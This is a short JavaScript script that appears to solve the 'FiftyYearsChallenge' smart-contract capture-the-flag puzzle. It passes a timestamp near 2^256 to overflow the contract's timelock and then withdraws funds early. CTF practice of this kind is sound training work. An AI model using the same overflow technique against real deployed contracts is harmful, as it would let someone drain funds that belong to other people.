async function main() {
    Challenge = await ethers.getContractFactory('FiftyYearsChallenge');
    challenge = await Challenge.attach('0x196cB7aB38944FC85053bc6C74429451c0982aEd')

    tx = await challenge.upsert(1, ethers.BigNumber.from('2').pow('256').sub(ethers.BigNumber.from('86400')), {value:1});
    await tx.wait();
    tx = await challenge.upsert(2, 0, {value:1});
    await tx.wait();
    tx = await challenge.withdraw(1);
    await tx.wait();
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error.message);
      process.exit(1);
  })